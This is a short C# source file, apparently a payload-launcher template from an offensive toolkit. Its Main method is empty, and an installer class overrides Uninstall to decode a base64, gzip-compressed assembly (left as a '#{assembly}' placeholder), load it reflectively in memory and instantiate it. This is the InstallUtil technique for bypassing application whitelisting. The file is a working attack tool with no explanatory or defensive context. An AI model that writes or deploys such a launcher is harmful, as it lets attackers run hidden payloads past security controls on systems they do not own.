using System;
class Program
{
    static void Main(string[] args)
    {
    }
}
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
		System.IO.Compression.GZipStream s = new System.IO.Compression.GZipStream(new System.IO.MemoryStream(Convert.FromBase64String("#{assembly}")), System.IO.Compression.CompressionMode.Decompress);
		System.IO.MemoryStream m = new System.IO.MemoryStream();

		const int size = 4096;
		byte[] buffer = new byte[size];

		int count = 0;
		do
		{
			count = s.Read(buffer, 0, size);
			if (count > 0)
			{
				m.Write(buffer, 0, count);
			}
		}
		while (count > 0);

		System.Reflection.Assembly a = System.Reflection.Assembly.Load(m.ToArray());
		Type at = a.GetTypes()[0];
		object ao = Activator.CreateInstance(at);
	}
}